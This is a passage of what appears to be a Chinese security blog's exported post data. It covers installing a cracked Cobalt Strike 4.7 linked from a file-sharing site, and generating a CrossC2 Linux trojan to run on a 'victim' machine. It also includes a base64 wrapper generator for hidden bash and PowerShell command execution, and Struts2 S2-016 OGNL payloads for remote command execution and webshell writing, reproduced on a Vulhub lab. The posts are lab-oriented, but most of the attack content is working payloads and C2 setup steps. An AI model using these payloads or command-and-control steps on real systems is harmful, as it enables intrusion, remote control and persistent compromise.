https://www.freebuf.com/articles/network/286276.html","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"cobalt strike 4.7å®‰è£…ä»¥åŠä½¿ç”¨","slug":"cobalt-strike-4-7å®‰è£…ä»¥åŠä½¿ç”¨","date":"2022-10-25T17:28:07.000Z","updated":"2024-11-12T06:59:46.000Z","comments":true,"path":"2022/10/26/cobalt-strike-4-7å®‰è£…ä»¥åŠä½¿ç”¨/","permalink":"https://gryffinbit.top/2022/10/26/cobalt-strike-4-7%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/","excerpt":"","text":"ç¯å¢ƒå®‰è£…ç ´è§£åŒ…ï¼š[cobalt_strike_4.7](é“¾æ¥: https://pan.baidu.com/s/1c2wxXLiyjz1jvbhCOKHskw?pwd=18kq æå–ç : 18kqâ€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜v6çš„åˆ†äº«) ï¼ˆå®¢æˆ·ç«¯ã€æœåŠ¡å™¨ç«¯ï¼Œéƒ½ç”¨è¿™ä¸ªï¼‰ å®¢æˆ·ç«¯ï¼š kali Linux 2021.3 æœåŠ¡ç«¯ï¼šè…¾è®¯äº‘ ubuntu æœåŠ¡å™¨ç«¯ è¿›å…¥csçš„ç›®å½• 1234cd cobalt_strike_4.7chmod +x teamserver chmod +x TeamServerImage./teamserver æœ¬æœºip å¯†ç  æœåŠ¡å™¨ç«¯é˜²ç«å¢™è®¾ç½®ã€‚ï¼ˆè‡ªå·±é€‰å®šä¸€ä¸ªç«¯å£ï¼Œä½œä¸ºè¿æ¥çš„ç«¯å£ï¼‰ é»˜è®¤ç«¯å£æ˜¯50050ï¼Œä½¿ç”¨é»˜è®¤ç«¯å£çš„è¯ï¼Œè®°å¾—å¼€å¯50050 12345# å®‰è£…firewallsudo apt-get install firewalldsudo systemctl start firewalldsudo systemctl enable firewalldsudo systemctl status firewalld 1234567891011121314151617181920# å¼€æ”¾ç«¯å£firewall-cmd --zone=public --add-port=ç«¯å£å·/tcp --permanent# å…³é—­ç«¯å£firewall-cmd --zone=public --remove-port=ç«¯å£å·/tcp --permanent# é…ç½®ç”Ÿæ•ˆfirewall-cmd --reload # æŸ¥çœ‹æ‰€æœ‰å¼€æ”¾çš„ç«¯å£firewall-cmd --zone=public --list-ports# å…³é—­é˜²ç«å¢™systemctl stop firewalld.service# æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€firewall-cmd --state# æŸ¥çœ‹ç›‘å¬çš„ç«¯å£netstat -lnpt# æ£€æŸ¥ç«¯å£è¢«å“ªä¸ªè¿›ç¨‹å ç”¨netstat -lnpt |grep ç«¯å£å·# æŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ps ç«¯å£å·# ä¸­æ­¢è¿›ç¨‹kill -9 ç«¯å£å· å®¢æˆ·ç«¯ è¿›å…¥ Cobalt Strike ç›®å½•ï¼Œæ‰§è¡Œ ./start.sh è¿æ¥æˆåŠŸ å—å®³æœºä¸Šçº¿(Linux) cobalt- strike4.4ç‰ˆæœ¬å®éªŒå¯¹è±¡ä¸ºLinux&#x2F;macOSç³»ç»Ÿï¼Œéœ€è¦ä¸‹è½½æ’ä»¶ã€‚ GitHubé¡¹ç›®ï¼šhttps://github.com/gloxec/CrossC2 æ’ä»¶å®‰è£…CSå®¢æˆ·ç«¯ï¼šä¸‹è½½Release v3.1.0 ç‰ˆæœ¬ã€‚ä¸‹è½½genCrossC2 å’ŒCrossC2Kitå°±è¡Œäº† å°†è¿™äº›æ–‡ä»¶éƒ½æ”¾è¿›æ–°å»ºæ–‡ä»¶å¤¹CrossC2ä¸­ï¼Œå†æŠŠCrossC2æ–‡ä»¶å¤¹æ”¾è¿›cobalt_strike_4.4æ–‡ä»¶å¤¹ä¸­ 1CrossC2Kit.zip åæ¸—é€linuxçš„æ’ä»¶ æ­£å¸¸åŠ è½½CSå®¢æˆ·ç«¯ï¼Œè¿›å…¥å®¢æˆ·ç«¯åé€‰æ‹©åŠ è½½è„šæœ¬ï¼Œé€‰æ‹©CrossC2Kité‡Œé¢çš„CrossC2Kit_Loader.cnaåŠ è½½ å¤åˆ¶æœåŠ¡ç«¯ä¸Šcobaltstrike4.4ç›®å½•ä¸‹çš„ .cobaltstrike.beacon_keysåˆ°æœ¬åœ°ç›®å½•ä¸‹ã€‚ å®¢æˆ·ç«¯ ï¼Œå°†.cobaltstrike.beacon_keysæ”¾è¿›CrossC2æ–‡ä»¶å¤¹ ç”Ÿæˆæœ¨é©¬è¦æ–°å»ºä¸€ä¸ªç›‘å¬å™¨ï¼Œè¦httpsçš„ã€‚ éœ€è¦æ‰‹åŠ¨ç”Ÿæˆæœ¨é©¬ï¼ŒCSå®¢æˆ·ç«¯ç”Ÿæˆçš„ä¸å¥½ç”¨ã€‚ 1234chmod +x genCrossC2.Linux ./genCrossC2.Linux ip 52000 .cobaltstrike.beacon_keys null Linux x64 lovetutu.elf# å°±æ˜¯./genCrossC2.Linux ç›‘å¬å™¨çš„ip ç›‘å¬å™¨çš„ç«¯å£ csæœåŠ¡å™¨ä¸Šçš„é‚£ä¸ªæ–‡ä»¶çš„è·¯å¾„ null Linux x64 æœ¨é©¬çš„è·¯å¾„å’Œåå­— ç„¶åå°±ä¼šç”Ÿæˆå¯ä»¥ç”¨çš„æœ¨é©¬å•¦~ åœ¨å—å®³æœºå™¨ä¸Šè¿è¡Œæœ¨é©¬ï¼Œå°±ä¸Šçº¿äº† â€‹","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"macosä¸Šapptranslocationæ˜¯ä»€ä¹ˆ","slug":"macosä¸Šapptranslocationæ˜¯ä»€ä¹ˆ","date":"2022-10-24T16:37:36.000Z","updated":"2024-11-12T06:59:27.000Z","comments":true,"path":"2022/10/25/macosä¸Šapptranslocationæ˜¯ä»€ä¹ˆ/","permalink":"https://gryffinbit.top/2022/10/25/macos%E4%B8%8Aapptranslocation%E6%98%AF%E4%BB%80%E4%B9%88/","excerpt":"","text":"ç³»ç»Ÿä»‹ç»æˆ‘çš„ç³»ç»Ÿæ˜¯macOS Montereyã€‚ M1.2020 é—®é¢˜ä»‹ç»ä»Šå¤©åœ¨è¿è¡Œä¸€ä¸ªç ´è§£æ–‡ä»¶çš„æ—¶å€™ï¼Œè§£å‹äº†è¯¥è½¯ä»¶çš„å‹ç¼©åŒ…ï¼Œç„¶åå»æ‰“å¼€å®ƒçš„readme.txt. ç³»ç»Ÿå¿½ç„¶æç¤ºï¼Œæˆ‘æœ‰ç£ç›˜æ’å…¥ã€‚å¼•èµ·äº†æˆ‘çš„è­¦è§‰ã€‚å½“æ—¶åœ¨æƒ³ï¼Œæ˜¯ä»€ä¹ˆï¼Ÿç—…æ¯’ï¼Ÿåé—¨ï¼Ÿä»¥å‰æ²¡åœ¨Macä¸Šä¸­è¿‡ç—…æ¯’ï¼Œäººå¾ˆè’™ã€‚ç«‹é©¬æ–­ç½‘å…³æœºï¼ŒæŸ¥æŸ¥æ€ä¹ˆå›äº‹ã€‚ å½“æ—¶é—®é¢˜çš„æˆªå›¾ ğŸ‘‡ è§£æƒ‘å¯¹AppTranslocationä¸‹æ‰‹æœç´¢ã€‚ macOSä¼šå¯¹æ–‡ä»¶è¿›è¡Œç­¾åéªŒè¯ï¼Œä»¥ä¾¿macOSçŸ¥é“ä¸‹è½½åå¯ä»¥ä¿¡ä»»ä»–ã€‚æ‰“åŒ…åœ¨æœªç­¾åçš„ç£ç›˜æ˜ åƒæˆ–.zipå­˜æ¡£ä¸Šçš„åº”ç”¨ç¨‹åºå—åˆ°App Translocationçš„çº¦æŸï¼Œä¼šé˜»æ­¢å®ƒçš„å·¥ä½œã€‚å½“åˆ¤æ–­ç­¾åæœ‰é—®é¢˜æ—¶ï¼Œä¼šå°†åº”ç”¨æ”¾åˆ°AppTranlocationä¸‹é¢ï¼Œè¿›è¡Œæ²™ç®±éš”ç¦»ã€‚ä¹‹åæ¯æ¬¡æ‰“å¼€éƒ½ä¼šèµ°æ²™ç®±è·¯å¾„ã€‚ åç»­æ²¡ç»§ç»­æ·±ç©¶ï¼Œåº”è¯¥æ²¡ä»€ä¹ˆå¨èƒã€‚å°±æ²¡ç®¡äº† å‚è€ƒæ–‡ç« https://forum.cocos.org/t/cocoscreator3d1-0-3-mac-10-14/88571/2","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"ä¸€äº›æ‚ä¸ƒæ‚å…«æé†’è‡ªå·±çš„ä¸œè¥¿","slug":"ä¸€äº›æ‚ä¸ƒæ‚å…«æé†’è‡ªå·±çš„ä¸œè¥¿","date":"2022-10-20T18:11:15.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/10/21/ä¸€äº›æ‚ä¸ƒæ‚å…«æé†’è‡ªå·±çš„ä¸œè¥¿/","permalink":"https://gryffinbit.top/2022/10/21/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%8F%90%E9%86%92%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%9C%E8%A5%BF/","excerpt":"","text":"åå¼¹shell@java.lang.Runtime@getRuntime().exec(â€˜idâ€™) base64ç¼–ç å·¥å…· 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;java runtime exec usage...&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Input type: &lt;input type=&quot;radio&quot; id=&quot;bash&quot; name=&quot;option&quot; value=&quot;bash&quot; onclick=&quot;processInput();&quot; checked=&quot;&quot;&gt;&lt;label for=&quot;bash&quot;&gt;Bash&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;powershell&quot; name=&quot;option&quot; value=&quot;powershell&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;powershell&quot;&gt;PowerShell&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;python&quot; name=&quot;option&quot; value=&quot;python&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;python&quot;&gt;Python&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;perl&quot; name=&quot;option&quot; value=&quot;perl&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;perl&quot;&gt;Perl&lt;/label&gt;&lt;/p&gt; &lt;p&gt;&lt;textarea rows=&quot;10&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;input&quot; placeholder=&quot;Type Bash here...&quot;&gt;&lt;/textarea&gt; &lt;textarea rows=&quot;5&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;output&quot; onclick=&quot;this.focus(); this.select();&quot; readonly=&quot;&quot;&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;script&gt; var taInput = document.querySelector(&#x27;textarea#input&#x27;); var taOutput = document.querySelector(&#x27;textarea#output&#x27;); function processInput() &#123; var option = document.querySelector(&#x27;input[name=&quot;option&quot;]:checked&#x27;).value; switch (option) &#123; case &#x27;bash&#x27;: taInput.placeholder = &#x27;Type Bash here...&#x27; taOutput.value = &#x27;bash -c &#123;echo,&#x27; + btoa(taInput.value) + &#x27;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;; break; case &#x27;powershell&#x27;: taInput.placeholder = &#x27;Type PowerShell here...&#x27; poshInput = &#x27;&#x27; for (var i = 0; i &lt; taInput.value.length; i++) &#123; poshInput += taInput.value[i] + unescape(&quot;%00&quot;); &#125; taOutput.value = &#x27;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc &#x27; + btoa(poshInput); break; case &#x27;python&#x27;: taInput.placeholder = &#x27;Type Python here...&#x27; taOutput.value = &quot;python -c exec(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;.decode(&#x27;base64&#x27;))&quot;; break; case &#x27;perl&#x27;: taInput.placeholder = &#x27;Type Perl here...&#x27; taOutput.value = &quot;perl -MMIME::Base64 -e eval(decode_base64(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;))&quot;; break; default: taOutput.value = &#x27;&#x27; &#125; if (!taInput.value) taOutput.value = &#x27;&#x27;; &#125; taInput.addEventListener(&#x27;input&#x27;, processInput, false); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; Shellã€å‘½ä»¤ç­‰ï¼Œä¸Šä¼ åˆ°javaçš„æ—¶å€™ï¼Œbase64ç¼–ç ä¸€ä¸‹ webæ”»å‡»ä¸€äº›æ³¨å…¥æ”»å‡»ï¼Œbpè¯¥åŒ…ç­‰æ”»å‡»ï¼Œæ³¨æ„urlç¼–ç ä¸€ä¸‹ ä»£ç å®¡è®¡çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨codeQLï¼Œç”¨æ¥æŸ¥æ‰¾æ¼æ´å‡½æ•° ä»£ç å®¡è®¡çš„æ—¶å€™ï¼Œå› ä¸ºä»£ç å¤ªå¤šäº†ï¼Œå‡½æ•°ä¹Ÿå¤ªå¤šäº†ï¼Œå°±å¯ä»¥ç”¨codeQLæ¥æ‰¾ä¸€äº›ç¬¦åˆæ¡ä»¶çš„å‡½æ•°ã€‚ åº”ç”¨åœºæ™¯ï¼šä½ éœ€è¦æ‰¾ä¸€ä¸ªå‡½æ•°ï¼Œä»–ä¼ å…¥çš„å‚æ•°æ˜¯Stringç±»å‹ï¼Œè€Œä¸”è¿”å›çš„å€¼ä¹Ÿæ˜¯Stringç±»å‹ï¼Œè¿˜æœ‰å°±æ˜¯å‡½æ•°åå­—æ˜¯setXxxè¿™æ ·çš„ cs rce CVE-2022-39197 æ¼æ´å¤ç° CS_XSS.ql 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/** * @kind path-problem */import java//æŸ¥æ‰¾sourceçš„ç±»åˆ°æ¶æ„ç±»çš„é€šè·¯//sourceæœ‰xxxå±æ€§ã€æœ‰setXXXæ–¹æ³•ä¸”æœ‰ä¸€ä¸ªStringå‚æ•°ã€instanceof Componentclass XXXSetMethod extends Method&#123; XXXSetMethod()&#123; this.getName().indexOf(&quot;set&quot;) = 0 and this.getName().length() &gt; 3 and this.getNumberOfParameters() = 1 and this.getAParamType().hasName(&quot;String&quot;) and this.getDeclaringType().getASupertype*().hasQualifiedName(&quot;java.awt&quot;, &quot;Component&quot;) &#125;&#125;class JNDIMethod extends Method&#123; JNDIMethod()&#123; this.getDeclaringType().getAnAncestor().hasQualifiedName(&quot;javax.naming&quot;, &quot;Context&quot;) and this.hasName(&quot;lookup&quot;) &#125;&#125;class InvokeMethod extends Method &#123; InvokeMethod() &#123; this.hasName(&quot;invoke&quot;) &#125;&#125;class NewInstanceMethod extends Method &#123; NewInstanceMethod() &#123; exists(RefType type, Method m| this.getACallee() = m and m.hasName(&quot;newInstance&quot;) and m.getDeclaringType*().getErasure() = type ) &#125;&#125;class CommandInjectMethod extends Method &#123; CommandInjectMethod() &#123; this.getACallee() instanceof ExecCallable &#125;&#125;class RuntimeMethod extends Method &#123; RuntimeMethod() &#123; this.getDeclaringType().hasQualifiedName(&quot;java.lang&quot;, &quot;Runtime&quot;) and this.hasName(&quot;exec&quot;) &#125;&#125;class TargetMethod extends Method &#123; TargetMethod() &#123; this instanceof JNDIMethod or // this instanceof InvokeMethod or // this instanceof NewInstanceMethod or this instanceof CommandInjectMethod or this instanceof MethodRuntimeExec or this instanceof MethodProcessBuilderCommand &#125;&#125;query predicate edges(Method a, Method b) &#123; a.polyCalls(b) &#125;from XXXSetMethod entryPoint, TargetMethod endwhere edges*(entryPoint, end)select entryPoint, entryPoint, end, &quot;Found a path from start to target.&quot;","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"struts2æ¼æ´å¤ç°ï¼ˆS2-016 S2-008 S2-057 S2-059ï¼‰","slug":"struts2æ¼æ´å¤ç°ï¼ˆS2-016-S2-008-S2-019-S2-057-S2-059ï¼‰","date":"2022-10-18T10:02:17.000Z","updated":"2024-11-12T06:59:13.000Z","comments":true,"path":"2022/10/18/struts2æ¼æ´å¤ç°ï¼ˆS2-016-S2-008-S2-019-S2-057-S2-059ï¼‰/","permalink":"https://gryffinbit.top/2022/10/18/struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88S2-016-S2-008-S2-019-S2-057-S2-059%EF%BC%89/","excerpt":"","text":"å®éªŒç¯å¢ƒ Vulhubé¶åœºï¼Œstruts2æ¼æ´å¤ç° Ubuntu: è…¾è®¯äº‘æœåŠ¡å™¨ï¼ŒUbuntu Server 20.04 LTS 64bit é¶åœºï¼šhttps://github.com/vulhub/vulhub.git å‰è¨€å‰æœŸçŸ¥è¯†å‚¨å¤‡ï¼Œè·³è½¬blogï¼šhttps://gryffinbit.top/2022/10/14/struts%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Aognl%E8%A1%A8%E8%BE%BE%E5%BC%8F/ æ¼æ´åŸç†S2-016 æ›´è¯¦ç»†çš„é€†å‘è¿‡ç¨‹ğŸ‘‡ https://blog.csdn.net/Fly_hps/article/details/85035223 struts2çš„actionã€redirectã€redirectActionå‰ç¼€å‚æ•°ï¼Œåœ¨å®ç°å…¶åŠŸèƒ½çš„è¿‡ç¨‹ä¸­ä½¿ç”¨äº†Ognlè¡¨è¾¾å¼ï¼Œå¹¶å°†ç”¨æˆ·é€šè¿‡URLæäº¤çš„å†…å®¹æ‹¼æ¥è¿›Ognlè¡¨è¾¾å¼ä¸­ï¼Œä»è€Œé€ æˆæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„URLæ¥æ‰§è¡Œä»»æ„Javaä»£ç ï¼Œä»Šå„¿å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ redirect: å’Œ redirectAction: æ­¤ä¸¤é¡¹å‰ç¼€ä¸ºStrutsé»˜è®¤å¼€å¯åŠŸèƒ½ã€‚ åœ¨struts2ä¸­ï¼ŒDefaultActionMapperç±»æ”¯æŒä»¥&quot;action:&quot;ã€â€œredirect:â€ã€&quot;redirectAction:&quot;ä½œä¸ºå¯¼èˆªæˆ–æ˜¯é‡å®šå‘å‰ç¼€ï¼Œä½†æ˜¯è¿™äº›å‰ç¼€åé¢åŒæ—¶å¯ä»¥è·ŸOGNLè¡¨è¾¾å¼ï¼Œç”±äºstruts2æ²¡æœ‰å¯¹è¿™äº›å‰ç¼€åšè¿‡æ»¤ï¼Œå¯¼è‡´åˆ©ç”¨OGNLè¡¨è¾¾å¼è°ƒç”¨javaé™æ€æ–¹æ³•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤. è®¿é—®http://ip/index.action?redirect:OGNLè¡¨è¾¾å¼å³å¯æ‰§è¡ŒOGNLè¡¨è¾¾å¼ã€‚ S2-008S2-008æ¶‰åŠå¤šä¸ªæ¼æ´ï¼Œcookieæ‹¦æˆªå™¨é…ç½®é”™è¯¯å¯é€ æˆognlè¡¨è¾¾å¼æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºå¤§å¤šwebå®¹å™¨å¯¹cookieåç§°éƒ½æœ‰å­—ç¬¦é™åˆ¶ï¼Œæ‰€ä»¥è¿™ä¸ªæ¼æ´ä¸å¸¸ç”¨ã€‚ ç”Ÿäº§ç¯å¢ƒä¸€èˆ¬ä¸ä¼šå­˜åœ¨è¯¥æ¼æ´ï¼Œä½†æ˜¯å¼€äº†debugæ¨¡å¼å°±å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ S2-057è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ å½±å“ç‰ˆæœ¬ï¼š &lt;&#x3D; Struts 2.3.34, Struts 2.5.16 åˆ©ç”¨æ¡ä»¶ï¼š alwaysSelectFullNamespaceå€¼ä¸ºtrue Struts2é…ç½®æ–‡ä»¶ä¸­ï¼Œactionå…ƒç´ æœªè®¾ç½®namespaceå±æ€§ï¼Œæˆ–ä½¿ç”¨äº†é€šé…ç¬¦ æ¼æ´åˆ†æï¼š é€šè¿‡TextParseUtil.translateVariables()è°ƒç”¨OgnlTextParser.evaluate()è§£ææ‰§è¡Œurlä¸­çš„OGNLè¡¨è¾¾å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œ S2-059ç”±äºæ ‡ç­¾å±æ€§å€¼è¿›è¡ŒäºŒæ¬¡è¡¨è¾¾å¼è§£æè€Œäº§ç”Ÿçš„å‘½ä»¤æ³¨å…¥æ¼æ´ åˆ©ç”¨æ¡ä»¶ï¼š å¿…é¡»å¼€å¯AltSyntaxï¼ˆå®ƒçš„åŠŸèƒ½æ˜¯å°†æ ‡ç­¾å†…çš„å†…å®¹å½“ä½œognlè¡¨è¾¾å¼è§£æã€‚ï¼‰ ç‰ˆæœ¬ä¸º Struts 2.0.0 - Struts 2.5.20 æ¼æ´åˆ†æ å¯¹idå±æ€§è¿›è¡ŒäºŒæ¬¡è§£æï¼Œå¯¼è‡´å‘½ä»¤æ³¨å…¥ã€‚ ç¬¬ä¸€æ¬¡è§£æï¼šä¸€æ­¥æ­¥è°ƒç”¨ï¼Œæœ€ç»ˆè°ƒç”¨äº†OgnlTextParser.evaluate()æ–¹æ³•ã€‚è¿›è¡Œäº†è§£æ ç¬¬äºŒæ¬¡è§£æï¼šè°ƒç”¨äº†&#96;&#96;findStringIfAltSyntax()æ–¹æ³•ï¼Œå¼€å¯altSyntaxåŠŸèƒ½çš„è¯ï¼Œåˆ™ä¼šå¯¹id&#96;å±æ€§å†æ¬¡è¿›è¡Œè¡¨è¾¾å¼è§£æã€‚ æ¼æ´å¤ç°S2-016 è¿›å…¥é¶åœº http://ip:8080/ ç³»ç»Ÿå‘½ä»¤æ‰§è¡ŒPOC æ‰§è¡Œå‘½ä»¤name -a 1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125; éœ€è¦å…ˆå°†POCè¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼š 1redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D æ‹¼æ¥ä¸Šé¶åœºåœ°å€ http://ip:8080/index.action 1http://ip:8080/index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D å¾—åˆ°ä¸€ä¸ªä¸‹è½½æ–‡ä»¶ ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º.htmlï¼Œå¾—åˆ°æ‰§è¡Œç»“æœ å¯ä»¥å¾—åˆ°ç”¨æˆ·b2fdbd82760bï¼Œå®é™…ä¸Šå®ƒæ˜¯dockerçš„å®¹å™¨ID ï¼ˆdockeræ¼æ´é¶åœºè§†è§’ğŸ‘‡ï¼‰ è§£å¯†Linuxç‰ˆæœ¬ä¿¡æ¯ 1Linux b2fdbd82760b 5.4.0-96-generic #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 x86_64 GNU/Linux 1234567Linux â€“- å†…æ ¸åç§°b2fdbd82760bâ€“- èŠ‚ç‚¹åx86_64 â€“- æœºå™¨ç¡¬ä»¶å5.4.0-96-generic â€“- å†…æ ¸å‘å¸ƒç‰ˆæœ¬ #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 -- å†…æ ¸ç‰ˆæœ¬GNU/Linux â€“- æ“ä½œç³»ç»Ÿ å…¶ä»–çš„è¿˜æœ‰ï¼šå¤„ç†å™¨ã€ç¡¬ä»¶å¹³å°ã€‚è¿™é‡Œæ²¡æœ‰æ˜¾ç¤ºï¼Œå¤§éƒ¨åˆ†æ˜¯x86_64 å†…æ ¸å‘è¡Œæ•°æ® 123455 è¡¨ç¤ºå†…æ ¸ç‰ˆæœ¬4 è¡¨ç¤ºä¸»è¦ç‰ˆæœ¬0 è¡¨ç¤ºæ¬¡è¦ç‰ˆæœ¬96 è¡¨ç¤ºæœ€æ–°è¡¥ä¸ #109 è¡¨ç¤ºæ­¤å‘å¸ƒç‰ˆæœ¬å·²ç»ç¼–è¯‘äº†109æ¬¡ è·å–webç›®å½•POC POC 1redirect:$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#ot.print(&#x27;web&#x27;),#ot.print(&#x27;path:&#x27;),#ot.print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;)),#ot.flush(),#ot.close()&#125; URLç¼–ç  1redirect%3A%24%7B%23req%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletReq%27%2B%27uest%27)%2C%23resp%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletRes%27%2B%27ponse%27)%2C%23resp.setCharacterEncoding(%27UTF-8%27)%2C%23ot%3D%23resp.getWriter%20()%2C%23ot.print(%27web%27)%2C%23ot.print(%27path%3A%27)%2C%23ot.print(%23req.getSession().getServletContext().getRealPath(%27%2F%27))%2C%23ot.flush()%2C%23ot.close()%7D æ‹¼æ¥é¶åœºåœ°å€ 1http://ip:8080/index.action?redirect%3A%24%7B%23req%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletReq%27%2B%27uest%27)%2C%23resp%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletRes%27%2B%27ponse%27)%2C%23resp.setCharacterEncoding(%27UTF-8%27)%2C%23ot%3D%23resp.getWriter%20()%2C%23ot.print(%27web%27)%2C%23ot.print(%27path%3A%27)%2C%23ot.print(%23req.getSession().getServletContext().getRealPath(%27%2F%27))%2C%23ot.flush()%2C%23ot.close()%7D å¾—åˆ°webç›®å½• å†™å…¥webshell poc 1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath(&quot;/&quot;)).append(@java.io.File@separator).append(&quot;1.jspx&quot;).toString()),#b.write(#a.getParameter(&quot;t&quot;).getBytes()),#b.close(),#genxor=#context.get(&quot;com.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(&quot;BINGO&quot;),#genxor.flush(),#genxor.close()&#125; urlç¼–ç  